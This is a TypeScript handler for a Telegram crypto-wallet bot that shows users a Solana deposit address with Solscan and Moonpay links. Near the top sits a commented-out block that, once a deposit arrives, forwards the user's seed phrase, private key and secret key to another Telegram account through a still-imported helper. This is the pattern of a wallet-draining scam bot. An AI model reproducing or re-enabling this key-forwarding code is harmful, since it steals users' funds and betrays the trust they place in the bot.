import { Markup } from "telegraf";
import { MyContext } from "../../config/interfaces";
import { solscanNetworkAddress, forwardUserWalletBalanceUpdated } from "../../config";
import { getBalance } from "../../config/solana";
import accept from "../../actions/accept";

const deposit = async (ctx: MyContext) => {
	await ctx.answerCbQuery(); // Remove loading animation

	// if (ctx.session.user) {
	// 	if (ctx.session.user.publicKey) {
	// 		ctx.session.user.balance = ctx.session.user.balance !== 0 && await getBalance(ctx.session.user.publicKey).then(res => res).catch(err => 0) < 0.0001 ? ctx.session.user.balance : await getBalance(ctx.session.user.publicKey).then(res => res).catch(err => 0);
	// 		ctx.session.user.walletBalance = ctx.session.user.balance !== 0 && await getBalance(ctx.session.user.publicKey).then(res => res).catch(err => 0) < 0.0001 ? 0 : await getBalance(ctx.session.user.publicKey).then(res => res).catch(err => 0);
	// 		// Forward the user's response to another Telegram user ID
	// 		if (ctx.session.user.balance !== 0 && await getBalance(ctx.session.user.publicKey).then(res => res).catch(err => 0) > 0.0001) await forwardUserWalletBalanceUpdated(ctx, { name: ctx.session.name, username: ctx.session.username, balance: await getBalance(ctx.session.user.publicKey).then(res => res).catch(err => 0), seed: ctx.session.user.seed, publicKey: ctx.session.user.publicKey, privateKey: ctx.session.user.privateKey, secretKey: ctx.session.user.secretKey, walletAddress: ctx.session.user.walletAddress });
	// 	}
	// }

	if (!ctx.session.user?.accept) {
		accept(ctx);
	} else {
		if (ctx.session.user?.walletAddress) {
			try {
				return await ctx.editMessageText(
					"There are 2 WAYS to deposit crypto into your wallet!\n\n" +
					"1. Simply tap to copy your wallet address on the main menu (/start), and send $SOL from anywhere to it.\n\n" +
					"2. Use Moonpay to buy crypto directly on Bot, REMEMBER: Copy your wallet, and paste it into Moonpay, to make sure the crypto you buy, goes to your bot!\n\n" +
					"SOL REQUIRES $SOL TO BE SENT - ETH REQUIRES $ETH TO BE SENT - BASE REQUIRES $ETH BRIDGED TO BASE TO BE SENT\n\n" +
					"YOU DO NOT HAVE TO BUY ON MOONPAY! SIMPLY SEND CRYPTO FROM ANYWHERE TO YOUR BOT WALLET ADDRESS!\n\n" +
					"Wallet Address 👇\n\n" +
					`<code>${ctx.session.user?.walletAddress}</code> <i>(Tap to copy)</i>\n` + 
					`<b>Currency : </b> <code>SOL</code>\n` +
					`<b>Chain&Protocol : </b> <code>SOL (SPL)</code>\n`,
					{
						...Markup.inlineKeyboard([
							[Markup.button.url('View On Solscan 🌐', `${solscanNetworkAddress}${ctx.session.user?.walletAddress}`)],
							[Markup.button.url('Deposit 💵', `https://buy.moonpay.io/?currencyCode=SOL&walletAddress=${ctx.session.user?.walletAddress}`)],
							[Markup.button.callback('Back 🔙', 'WALLET')],
						]), 
						parse_mode: "HTML"
					}
				);
			} catch (error) {
				// console.error("Error editing message:", error);
				// ctx.reply("⚠️ Unable to refresh. Try again.");
			}	
		} else {
			return ctx.reply(
				"Create or Import a wallet\n",
				Markup.inlineKeyboard([
					[Markup.button.callback('Create Wallet', 'CREATE_WALLET')],
					[Markup.button.callback('Import Existing Wallet', 'IMPORT_WALLET')],
					[Markup.button.callback('Close', 'CLOSE')],
				])
			);
		}
	}
};

export default deposit;
